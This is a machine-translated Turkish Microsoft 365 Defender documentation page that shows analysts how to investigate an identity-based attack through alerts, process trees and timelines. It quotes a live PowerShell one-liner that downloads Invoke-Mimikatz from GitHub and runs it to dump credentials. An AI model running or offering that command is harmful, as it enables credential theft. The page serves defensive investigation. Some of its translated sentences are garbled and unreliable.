---
title: Kimlik tabanlı bir saldırı örneği
description: Kimlik tabanlı bir saldırının örnek çözümlemesinde adım adım ilerler.
keywords: olaylar, uyarılar, araştırma, korelasyon, saldırı, makineler, cihazlar, kullanıcılar, kimlikler, kimlik, posta kutusu, e-posta, 365, microsoft, m365, olay yanıtı, siber saldırı
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 20b9fca87e003c0c776c9f614afaa1b6054c24a5
ms.sourcegitcommit: 3b8e009ea1ce928505b8fc3b8926021fb91155f3
ms.translationtype: MT
ms.contentlocale: tr-TR
ms.lasthandoff: 03/28/2022
ms.locfileid: "64500287"
---
# <a name="example-of-an-identity-based-attack"></a>Kimlik tabanlı bir saldırı örneği

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Aşağıdakiler için geçerlidir:**
- Microsoft 365 Defender

Kimlik için Microsoft Defender, kötü amaçlı girişimleri algılamaya yardımcı olarak, organizasyon kimliklerini tehlikeye atma konusunda yardımcı olabilir. Identity için Defender, kimlik Microsoft 365 Defender ile tümleştiri olduğundan, güvenlik analistleri şüpheli Netlogon ayrıcalık yükseltme girişimleri gibi Identity için Defender'dan gelen tehditlere karşı görünürlük sağlar.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Saldırıyı iş yerinde Kimlik için Microsoft Defender

Microsoft 365 Defender, analistlerin olaylar sayfasının Uyarılar sekmesindeki algılama **kaynağıyla uyarıları** filtrelemelerine olanak sağlar. Aşağıdaki örnekte algılama kaynağı, Kimlik için Defender olarak **filtre uygulanmıştır**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Çalışma alanında algılama kaynağını Kimlik için Microsoft Defender" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

Şüpheli **üstteki karmser saldırı uyarısını** seçmek, şu ifadede daha ayrıntılı bilgi Microsoft Defender for Cloud Apps bir sayfaya gider. Saldırı ve düzeltme önerilerinin açıklamasını okumak için Bu uyarı türü hakkında daha fazla  bilgi alın öğesini seçerek her zaman bir uyarı [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) veya saldırı hakkında daha fazla bilgi bulabilirsiniz.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Şüpheli bir üstteki karmser saldırı uyarısı" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Aynı saldırıyı iş yerinde Uç Nokta için Microsoft Defender

Alternatif olarak, bir analist uç nokta üzerinde etkinlik hakkında daha fazla bilgi edinmek için Uç Nokta için Defender'ı kullanabilir. Olay sırasından olayı seçin ve sonra Uyarılar **sekmesini** seçin. Buradan, algılama kaynağını da tanımlayabilirler. Uç Nokta olarak etiketlenmiş algılama EDR Uç Nokta için Defender olan Uç Nokta Algılama ve Yanıt'ın açılımıdır. Analist buradan, güvenlik uzmanı tarafından algılanan bir uyarıyı EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Yeni Portalda Uç Nokta Algılama Uç Nokta için Microsoft Defender Yanıt" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png"::: 

Uyarı sayfasında, etkilenen cihaz adı, kullanıcı adı, otomatik soruşturma durumu ve uyarı ayrıntıları gibi çeşitli bilgiler görüntülenir. Uyarı hikayesinde, işlem ağacının görsel bir gösterimi yer almaktadır. İşlem ağacı, uyarıyla ilgili üst ve alt işlemlerin hiyerarşik bir gösterimidir.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="alan içinde bir uyarı işlemi Uç Nokta için Microsoft Defender" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

Daha fazla ayrıntı görüntülemek için her işlem genişletilebilir. Bir analistin göreceği ayrıntılar kötü amaçlı bir betiğin parçası olarak girilen gerçek komutlar, giden bağlantı IP adresleri ve diğer yararlı bilgilerdir.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Uç Nokta için Microsoft Defender portalında süreç ayrıntıları" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
Zaman çizelgesinde **gör'i seçerek**, analist güvenlik güvenliğinin tam zamanı belirlemek için daha da detaya iner. 

Uç Nokta için Microsoft Defender birçok kötü amaçlı dosya ve betik algılanabilir. Bununla birlikte, giden bağlantılar, PowerShell ve komut satırı etkinliklerinin pek çok yasal kullanımı nedeniyle, kötü amaçlı bir dosya veya etkinlik oluşturana kadar bazı etkinlikler izin olarak kabul edilir. Bu nedenle, zaman çizelgesini kullanmak analistlerin ortak dosya sistemi ve kullanıcı etkinliğine yönelik saldırının özgün kaynağını veya saatlerini belirlemek üzere uyarıyı çevresindeki etkinlikle ilgili bağlama eklemesine yardımcı olur. 

Zaman çizelgesini kullanmak için, bir analist uyarı algılama zamanında (kırmızıyla) başlayabilir ve kötü amaçlı etkinliğin başladığı özgün etkinliğin ne zaman başlayacağını belirlemek için geriye doğru kaydırır. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Uyarı algılama için analistin başlangıç zamanı" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

Windows Update bağlantıları, Windows Yazılım etkinleştirme trafiği, Microsoft sitelerine diğer yaygın bağlantılar, üçüncü taraf İnternet etkinlikleri, Microsoft Endpoint Configuration Manager etkinlikleri ve şüpheli etkinlikler gibi sık kullanılan etkinlikleri anlamak ve ayırt etmek önemlidir. etkinlik. Zaman çizelgesi filtrelerini kullanarak ayırt etmek için bir yol vardır. Analistin görüntülemek istemediklerini filtrelerlerken belirli etkinliği vurgulayan birçok filtre vardır. 

Aşağıdaki resimde, yalnızca ağ ve süreç olaylarını görüntülemek için filtrelenmiş analist. Bu filtre ölçütü, analistin etkinliği çevreleyen ağ bağlantılarını ve süreçleri görmelerine olanak Not Defteri; işlem ağacında da gördüğümüz IP adresiyle bir bağlantı kurabilirsiniz. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Giden Not Defteri kötü amaçlı bağlantı yapmak için nasıl kullanılır?" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

Bu özel olayda, Not Defteri giden bağlantı yapmak için bu kod kullanılmıştır. Ancak genellikle saldırganlar kötü amaçlı iexplorer.exe indirmek üzere bağlantı kurmak için iexplorer.exe kullanır çünkü normalde bu işlemler normal web tarayıcısı etkinliği olarak kabul edilir.

Zaman çizelgesinde bakıla diğer bir öğe, PowerShell'in giden bağlantılar için kullandığı öğe olabilir. Analist, kötü amaçlı dosyayı barındıran bir web sitesine `IEX (New-Object Net.Webclient)` giden bağlantı gibi komutların ve ardından da giden bağlantının olduğu başarılı PowerShell bağlantılarını elde eder. 

Aşağıdaki örnekte, PowerShell bir web sitesinden Mimikatz'i indirmek ve yürütmek için kullanılmıştır:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Analist, yalnızca PowerShell ile oluşturulan olayları görüntülemek için arama çubuğuna anahtar sözcüğü yazarak anahtar sözcükleri hızla arayabilir. 

## <a name="next-step"></a>Sonraki adım

Kimlik avı [soruşturması](first-incident-path-phishing.md) yoluna bakın.

## <a name="see-also"></a>Ayrıca bkz.

- [Olaylara genel bakış](incidents-overview.md)
- [Olayları yönetin](manage-incidents.md)
- [Olayları araştırın](investigate-incidents.md)
